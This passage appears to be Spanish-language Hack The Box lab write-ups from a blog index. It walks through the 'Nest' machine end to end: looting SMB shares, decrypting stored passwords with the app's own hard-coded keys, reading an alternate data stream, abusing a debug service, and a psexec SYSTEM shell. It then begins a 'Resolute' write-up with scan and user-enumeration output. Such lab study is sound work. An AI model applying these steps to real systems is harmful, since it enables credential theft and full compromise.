10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\\u0026gt; cd Maintenance smb: \\Shared\\Maintenance\\\u0026gt; dir . D 0 Wed Aug 7 13:07:32 2019 .. D 0 Wed Aug 7 13:07:32 2019 Maintenance Alerts.txt A 48 Mon Aug 5 17:01:44 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Maintenance\\\u0026gt; get \u0026#34;Maintenance Alerts.txt\u0026#34; getting file \\Shared\\Maintenance\\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\Shared\\Maintenance\\\u0026gt; cd ..\\Templates smb: \\Shared\\Templates\\\u0026gt; dir . D 0 Wed Aug 7 13:08:07 2019 .. D 0 Wed Aug 7 13:08:07 2019 HR D 0 Wed Aug 7 13:08:01 2019 Marketing D 0 Wed Aug 7 13:08:06 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Templates\\\u0026gt; dir HR HR D 0 Wed Aug 7 13:08:01 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Templates\\\u0026gt; cd HR smb: \\Shared\\Templates\\HR\\\u0026gt; dir . D 0 Wed Aug 7 13:08:01 2019 .. D 0 Wed Aug 7 13:08:01 2019 Welcome Email.txt A 425 Wed Aug 7 16:55:36 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Templates\\HR\\\u0026gt; get \u0026#39;Welcome Email.txt\u0026#39; NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \\Shared\\Templates\\HR\\\u0026#39;Welcome smb: \\Shared\\Templates\\HR\\\u0026gt; get \u0026#34;Welcome Email.txt\u0026#34; getting file \\Shared\\Templates\\HR\\Welcome Email.txt of size 425 as Welcome Email.txt (0.6 KiloBytes/sec) (average 0.1 KiloBytes/sec) smb: \\Shared\\Templates\\HR\\\u0026gt; cd ..\\Marketing smb: \\Shared\\Templates\\Marketing\\\u0026gt; dir . D 0 Wed Aug 7 13:08:06 2019 .. D 0 Wed Aug 7 13:08:06 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Templates\\Marketing\\\u0026gt;   Los archivos que encontramos son archivos de texto que contienen notas, en una de ellas encontramos las credenciales de uno de los usuarios de la maquina.\nMaintenance Alerts.txt:\nThere is currently no scheduled maintenance work Welcome Email.txt:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  We would like to extend a warm welcome to our newest member of staff, \u0026lt;FIRSTNAME\u0026gt; \u0026lt;SURNAME\u0026gt; You will find your home folder in the following location: \\\\HTB-NEST\\Users\\\u0026lt;USERNAME\u0026gt; If you have any issues accessing specific services or workstations, please inform the IT department and use the credentials below until all systems have been set up for you. Username: TempUser Password: welcome2019 Thank you HR   USER - C.Smith Utilizamos las credenciales para enumerar los SHARENAME que estan disponibles en la maquina, en un directorio encontramos un archivo XML RU_config.xml el cual contiene credenciales especificamente de C.Smith.\n1 2 3 4 5 6 7 8 9 10  \\\\\\\\10.10.10.178\\\\Data smb: \\IT\\Configs\\\u0026gt; cd \u0026#34;RU Scanner\u0026#34; smb: \\IT\\Configs\\RU Scanner\\\u0026gt; dir . D 0 Wed Aug 7 14:01:13 2019 .. D 0 Wed Aug 7 14:01:13 2019 RU_config.xml A 270 Thu Aug 8 13:49:37 2019 10485247 blocks of size 4096. 6449668 blocks available smb: \\IT\\Configs\\RU Scanner\\\u0026gt; get RU_config.xml getting file \\IT\\Configs\\RU Scanner\\RU_config.xml of size 270 as RU_config.xml (0.2 KiloBytes/sec) (average 3.4 KiloBytes/sec)   RU_config.xml:\n1 2 3 4 5 6  \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;ConfigFile xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;Port\u0026gt;389\u0026lt;/Port\u0026gt; \u0026lt;Username\u0026gt;c.smith\u0026lt;/Username\u0026gt; \u0026lt;Password\u0026gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u0026lt;/Password\u0026gt; \u0026lt;/ConfigFile\u0026gt;   Tambien encontramos un proyecto que lleva el nombre de RU, para encontrar el directorio de Carl, enumeramos el SHARENAME Data en el cual encontramos un archivo xml en donde se describe un \u0026ldquo;archivo temporal\u0026rdquo; en \\Secure$\\IT\\Carl\\Temp.txt el cual no existe.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  smb: \\IT\\Configs\\NotepadPlusPlus\\\u0026gt; dir . D 0 Wed Aug 7 13:31:37 2019 .. D 0 Wed Aug 7 13:31:37 2019 config.xml A 6451 Wed Aug 7 17:01:25 2019 shortcuts.xml A 2108 Wed Aug 7 13:30:27 2019 10485247 blocks of size 4096. 6449680 blocks available smb: \\IT\\Configs\\NotepadPlusPlus\\\u0026gt; get config.xml getting file \\IT\\Configs\\NotepadPlusPlus\\config.xml of size 6451 as config.xml (7.7 KiloBytes/sec) (average 7.7 KiloBytes/sec) smb: \\IT\\Configs\\NotepadPlusPlus\\\u0026gt; exit root@aoiri:~/htb/nest# tail config.xml \u0026lt;Find name=\u0026#34;redeem on\u0026#34; /\u0026gt; \u0026lt;Find name=\u0026#34;192\u0026#34; /\u0026gt; \u0026lt;Replace name=\u0026#34;C_addEvent\u0026#34; /\u0026gt; \u0026lt;/FindHistory\u0026gt; \u0026lt;History nbMaxFile=\u0026#34;15\u0026#34; inSubMenu=\u0026#34;no\u0026#34; customLength=\u0026#34;-1\u0026#34;\u0026gt; \u0026lt;File filename=\u0026#34;C:\\windows\\System32\\drivers\\etc\\hosts\u0026#34; /\u0026gt; \u0026lt;File filename=\u0026#34;\\\\HTB-NEST\\Secure$\\IT\\Carl\\Temp.txt\u0026#34; /\u0026gt; \u0026lt;File filename=\u0026#34;C:\\Users\\C.Smith\\Desktop\\todo.txt\u0026#34; /\u0026gt; \u0026lt;/History\u0026gt; \u0026lt;/NotepadPlus\u0026gt; root@aoiri:~/htb/nest#   Dicho Directorio nos llevo a encontrar el Proyecto RU.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; dir . D 0 Tue Aug 6 08:47:41 2019 .. D 0 Tue Aug 6 08:47:41 2019 RU D 0 Fri Aug 9 09:36:45 2019 10485247 blocks of size 4096. 6449639 blocks available smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; mask \u0026#34;\u0026#34; smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; recurse ON smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; prompt OFF smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; mget * getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\ConfigFile.vb of size 772 as ConfigFile.vb (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\Module1.vb of size 279 as Module1.vb (0.8 KiloBytes/sec) (average 1.5 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Application.Designer.vb of size 441 as Application.Designer.vb (1.2 KiloBytes/sec) (average 1.4 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Application.myapp of size 481 as Application.myapp (1.5 KiloBytes/sec) (average 1.4 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\AssemblyInfo.vb of size 1163 as AssemblyInfo.vb (1.9 KiloBytes/sec) (average 1.6 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Resources.Designer.vb of size 2776 as Resources.Designer.vb (7.8 KiloBytes/sec) (average 2.5 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Resources.resx of size 5612 as Resources.resx (9.3 KiloBytes/sec) (average 3.9 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Settings.Designer.vb of size 2989 as Settings.Designer.vb (8.6 KiloBytes/sec) (average 4.4 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Settings.settings of size 279 as Settings.settings (0.8 KiloBytes/sec) (average 4.1 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\RU Scanner.vbproj of size 4828 as RU Scanner.vbproj (13.3 KiloBytes/sec) (average 4.9 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\RU Scanner.vbproj.user of size 143 as RU Scanner.vbproj.user (0.3 KiloBytes/sec) (average 4.4 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\SsoIntegration.vb of size 133 as SsoIntegration.vb (0.4 KiloBytes/sec) (average 4.1 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\Utils.vb of size 4888 as Utils.vb (7.5 KiloBytes/sec) (average 4.5 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner.sln of size 871 as RUScanner.sln (2.3 KiloBytes/sec) (average 4.4 KiloBytes/sec)   PROJECT VB Descargamos el proyecto, analizamos el codigo y vemos que es un proyecto que encripta una contraseña o una string desde un archivo de XML y tambien lo desencripta. Modificamos y ejecutamos el proyecto con el archivo RU_config.xml para obtener la contraseña de C.Smith.\nFuncion DecryptString:\n1 2  Console.WriteLine(\u0026#34;Decrypted Text: \u0026#34; +Decrypt(EncryptedString, \u0026#34;N3st22\u0026#34;, \u0026#34;88552299\u0026#34;, 2, \u0026#34;464R5DFA5DL6LE28\u0026#34;, 256)) Threading.Thread.Sleep(50000)   Credenciales:\nC.Smit:xRxRxPANCAK3SxRxRx Utilizamos la contraseña en SAMBA (Users) y logramos leer nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  root@aoiri:~/htb/nest/tmp# smbclient \\\\\\\\10.10.10.178\\\\Users -U C.Smith Enter WORKGROUP\\C.Smith\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Sat Jan 25 17:04:21 2020 .. D 0 Sat Jan 25 17:04:21 2020 Administrator D 0 Fri Aug 9 09:08:23 2019 C.Smith D 0 Sun Jan 26 01:21:44 2020 L.Frost D 0 Thu Aug 8 11:03:01 2019 R.Thompson D 0 Thu Aug 8 11:02:50 2019 TempUser D 0 Wed Aug 7 16:55:56 2019 10485247 blocks of size 4096. 6449275 blocks available smb: \\\u0026gt; cd C.Smith smb: \\C.Smith\\\u0026gt; dir . D 0 Sun Jan 26 01:21:44 2020 .. D 0 Sun Jan 26 01:21:44 2020 HQK Reporting D 0 Thu Aug 8 17:06:17 2019 user.txt A 32 Thu Aug 8 17:05:24 2019 10485247 blocks of size 4096. 6449275 blocks available smb: \\C.Smith\\\u0026gt; get user.txt getting file \\C.Smith\\user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\C.Smith\\\u0026gt; exit root@aoiri:~/htb/nest/tmp# cat user.txt cf71b25404be5d84fd827e05f426e987 root@aoiri:~/htb/nest/tmp#   PRIVILEGE ESCALATION Dentro de la carpeta principal de C.Smith encontramos dos archivos el primero parecia estar vacio Debug Mode Password.txt y el segundo HqkLdap.exe un ejecutable. Al obtener más informacion de este archivo encontramos que tiene Alternative Data Streams como en la maquina Dropzone de HackTheBox, obtenemos el archivo y encontramos lo que parece ser una contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  root@aoiri:~/htb# smbclient \\\\\\\\10.10.10.178\\\\Users -U C.Smith #xRxRxPANCAK3SxRxRx Enter WORKGROUP\\C.Smith\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Sat Jan 25 17:04:21 2020 .. D 0 Sat Jan 25 17:04:21 2020 Administrator D 0 Fri Aug 9 09:08:23 2019 C.Smith D 0 Sun Jan 26 01:21:44 2020 L.Frost D 0 Thu Aug 8 11:03:01 2019 R.Thompson D 0 Thu Aug 8 11:02:50 2019 TempUser D 0 Wed Aug 7 16:55:56 2019 10485247 blocks of size 4096. 6449700 blocks available smb: \\\u0026gt; cd \u0026#34;C.Smith\\HQK Reporting\\\u0026#34; smb: \\C.Smith\\HQK Reporting\\\u0026gt; dir . D 0 Thu Aug 8 17:06:17 2019 .. D 0 Thu Aug 8 17:06:17 2019 AD Integration Module D 0 Fri Aug 9 06:18:42 2019 Debug Mode Password.txt A 0 Thu Aug 8 17:08:17 2019 HQK_Config_Backup.xml A 249 Thu Aug 8 17:09:05 2019 10485247 blocks of size 4096. 6449700 blocks available smb: \\C.Smith\\HQK Reporting\\\u0026gt; allinfo \u0026#34;Debug Mode Password.txt\u0026#34; altname: DEBUGM~1.TXT create_time: Thu Aug 8 05:06:12 PM 2019 CST access_time: Thu Aug 8 05:06:12 PM 2019 CST write_time: Thu Aug 8 05:08:17 PM 2019 CST change_time: Thu Aug 8 05:08:17 PM 2019 CST attributes: A (20) stream: [::$DATA], 0 bytes stream: [:Password:$DATA], 15 bytes smb: \\C.Smith\\HQK Reporting\\\u0026gt; get \u0026#34;Debug Mode Password.txt:Password:$DATA\u0026#34; getting file \\C.Smith\\HQK Reporting\\Debug Mode Password.txt:Password:$DATAof size 15 as Debug Mode Password.txt:Password:$DATA(0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\C.Smith\\HQK Reporting\\\u0026gt; exit root@aoiri:~/htb# cat Debug\\ Mode\\ Password.txt\\:Password\\:\\$DATA WBQ201953D8w root@aoiri:~/htb#   Data Streams - SAMBA\nHQK Reporting Service En el segundo puerto utilizamos telnet para conectarnos, y por lo que parece es un servicio en el cual podemos ejecutar ciertos comandos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  root@aoiri:~/htb/nest# rlwrap telnet 10.10.10.178 4386 Trying 10.10.10.178... Connected to 10.10.10.178. Escape character is \u0026#39;^]\u0026#39;. HQK Reporting Service V1.2 \u0026gt;HELP This service allows users to run queries against databases using the legacy HQK format --- AVAILABLE COMMANDS --- LIST SETDIR \u0026lt;Directory_Name\u0026gt; RUNQUERY \u0026lt;Query_ID\u0026gt; DEBUG \u0026lt;Password\u0026gt; HELP \u0026lt;Command\u0026gt; \u0026gt;   Enumeramos los querys que existen en el servicio y por lo que parece el servicio utiliza carpetas como directorio y ejecuta los querys (archivos) que existen el directorio, por lo que nos podemos mover a traves de C:\\ como si fuera una consola pero con distintos comandos.\nUno de los comandos interesante es el DEBUG ya que al utilizar este comando junto con la contraseña, tenemos nuevos comandos los cuales podemos ejecutar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  \u0026gt;DEBUG WBQ201953D8w Debug mode enabled. Use the HELP command to view additional commands that are now available \u0026gt;HELP This service allows users to run queries against databases using the legacy HQK format --- AVAILABLE COMMANDS --- LIST SETDIR \u0026lt;Directory_Name\u0026gt; RUNQUERY \u0026lt;Query_ID\u0026gt; DEBUG \u0026lt;Password\u0026gt; HELP \u0026lt;Command\u0026gt; SERVICE SESSION SHOWQUERY \u0026lt;Query_ID\u0026gt; \u0026gt;SETDIR .. Current directory set to HQK \u0026gt;LIST Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY [DIR] ALL QUERIES [DIR] LDAP [DIR] Logs [1] HqkSvc.exe [2] HqkSvc.InstallState [3] HQK_Config.xml Current Directory: HQK \u0026gt;SHOWQUERY 3 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;ServiceSettings xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;Port\u0026gt;4386\u0026lt;/Port\u0026gt; \u0026lt;DebugPassword\u0026gt;WBQ201953D8w\u0026lt;/DebugPassword\u0026gt; \u0026lt;QueryDirectory\u0026gt;C:\\Program Files\\HQK\\ALL QUERIES\u0026lt;/QueryDirectory\u0026gt; \u0026lt;/ServiceSettings\u0026gt; \u0026gt;   Dentro de los directorios encontramos la contraseña del usuario Administrator.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  Current Directory: HQK \u0026gt;SETDIR LDAP Current directory set to LDAP \u0026gt;LIST Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY [1] HqkLdap.exe [2] Ldap.conf Current Directory: LDAP \u0026gt;SHOWQUERY 2 Domain=nest.local Port=389 BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local User=Administrator Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4= \u0026gt;   DNSPY Utilizamos DNSPY para desensamblar el archivo ejecutable que encontramos, al analizar el codigo vemos que utiliza la misma encriptacion que el proyecto \u0026lsquo;RU Scanner\u0026rsquo; con los mismos parametros.\nUtilizamos el projecto \u0026lsquo;RU Scanner\u0026rsquo; con los parametros de encriptacion pasando la contraseña de administrador.\n1 2  Console.Write(\u0026#34;Decrypted: \u0026#34;+Decrypt(\u0026#34;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=\u0026#34;, \u0026#34;667912\u0026#34;, \u0026#34;1313Rf99\u0026#34;, 3, \u0026#34;1L1SA61493DRV53Z\u0026#34;, 256)) Threading.Thread.Sleep(50000)   VB:\nCredenciales:\nAdministrator:XtH4nkS4Pl4y1nGX PSEXEC Utilizamos psexec.py de impacket para obtener nuestra shell y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  root@aoiri:~/htb/nest# /root/tools/impacket/examples/psexec.py \u0026#39;Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178\u0026#39; Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on 10.10.10.178..... [*] Found writable share ADMIN$ [*] Uploading file GHkDSZLH.exe [*] Opening SVCManager on 10.10.10.178..... [*] Creating service QTBl on 10.10.10.178..... [*] Starting service QTBl..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt 6594c2e[ ... ]94b878c41 C:\\Windows\\system32\u0026gt;   ","description":"Tras enumerar SAMBA encontramos credenciales para un segundo recurso donde descubrimos una contraseña encriptada y proyecto de Visual Studio, con este ultimo logramos desencriptar la contraseña. Con ello ingresamos a un nuevo recurso donde encontramos Alternative Data Streams en un ejecutable, dentro de este encontramos una contraseña que utilizamos en un servicio de reporteria, utilizamos DNSPY en un ejecutable para leer el codigo fuente lo que nos permitio conseguir la contraseña del administrador y obtener acceso privilegiado utilizando psexec de Impacket.","id":80,"section":"posts","tags":["smbclient","HQK Reporting"],"title":"Hack The Box - Nest","uri":"https://sckull.github.io/posts/nest/"},{"content":"  Resolute con SO Windows expone Samba y Ldap, lo que nos dio informacion para ingresar por WinRM. Encontramos credenciales en un archivo para tener acceso a un segundo usuario. Encontramos que el usuario petenece al grupo DnsAdmins, configuramos dnscmd con un payload de metasploit para conseguir una shell como administrador.\nInformacion de la Maquina    Nombre Resolute      OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.169   Maker egre55    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.8, 7.7, 5.9, 4.1, 2.3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[6, 7, 3, 7, 3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79  masscan -p1-65535,U:1-65535 10.10.10.169 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-03 21:06:25 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 3269/tcp on 10.10.10.169 Discovered open port 5985/tcp on 10.10.10.169 Discovered open port 464/tcp on 10.10.10.169 Discovered open port 65511/udp on 10.10.10.169 Discovered open port 593/tcp on 10.10.10.169 Discovered open port 49665/tcp on 10.10.10.169 Discovered open port 3268/tcp on 10.10.10.169 Discovered open port 49915/tcp on 10.10.10.169 Discovered open port 389/tcp on 10.10.10.169 Discovered open port 88/tcp on 10.10.10.169 Discovered open port 49667/tcp on 10.10.10.169 Discovered open port 56647/udp on 10.10.10.169 Discovered open port 53/tcp on 10.10.10.169 # Nmap 7.80 scan initiated Fri Jan 3 15:11:12 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.169 Warning: 10.10.10.169 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.169 Host is up (0.14s latency). Not shown: 63791 closed ports, 1719 filtered ports PORT STATE SERVICE VERSION 53/tcp open tcpwrapped 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-01-03 21:24:08Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found 9389/tcp open adws? 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open unknown 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49688/tcp open msrpc Microsoft Windows RPC 49915/tcp open msrpc Microsoft Windows RPC 52015/tcp open tcpwrapped 52105/tcp open tcpwrapped Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h48m08s, deviation: 4h37m09s, median: 8m07s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Resolute | NetBIOS computer name: RESOLUTE\\x00 | Domain name: megabank.local | Forest name: megabank.local | FQDN: Resolute.megabank.local |_ System time: 2020-01-03T13:25:11-08:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-01-03T21:25:14 |_ start_date: 2020-01-03T20:29:32 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 3 15:18:57 2020 -- 1 IP address (1 host up) scanned in 464.61 seconds   ENUM4LINUX Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271  ========================== | Target Information | ========================== Target ........... 10.10.10.169 RID Range ........ 500-550,1000-1050 Username ......... \u0026#39;\u0026#39; Password ......... \u0026#39;\u0026#39; Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== | Enumerating Workgroup/Domain on 10.10.10.169 | ==================================================== [E] Can\u0026#39;t find workgroup/domain ============================================ | Nbtstat Information for 10.10.10.169 | ============================================ Looking up status of 10.10.10.169 No reply from 10.10.10.169 ===================================== | Session Check on 10.10.10.169 | ===================================== [+] Server 10.10.10.169 allows sessions using username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39; [+] Got domain/workgroup name: =========================================== | Getting domain SID for 10.10.10.169 | =========================================== Domain Name: MEGABANK Domain Sid: S-1-5-21-1392959593-3013219662-3596683436 [+] Host is part of a domain (not a workgroup) ====================================== | OS information on 10.10.10.169 | ====================================== [+] Got OS info for 10.10.10.169 from smbclient: [+] Got OS info for 10.10.10.169 from srvinfo: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED ============================= | Users on 10.10.10.169 | ============================= index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail\tName: (null)\tDesc: (null) index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator\tName: (null)\tDesc: Built-in account for administering the computer/domain index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela\tName: (null)\tDesc: (null) index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette\tName: (null)\tDesc: (null) index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika\tName: (null)\tDesc: (null) index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire\tName: (null)\tDesc: (null) index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude\tName: (null)\tDesc: (null) index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount\tName: (null)\tDesc: A user account managed by the system. index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia\tName: (null)\tDesc: (null) index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred\tName: (null)\tDesc: (null) index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest\tName: (null)\tDesc: Built-in account for guest access to the computer/domain index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo\tName: (null)\tDesc: (null) index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt\tName: (null)\tDesc: Key Distribution Center Service Account index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus\tName: (null)\tDesc: (null) index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko\tName: Marko Novak\tDesc: Account created. Password set to Welcome123! index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie\tName: (null)\tDesc: (null) index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki\tName: (null)\tDesc: (null) index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo\tName: (null)\tDesc: (null) 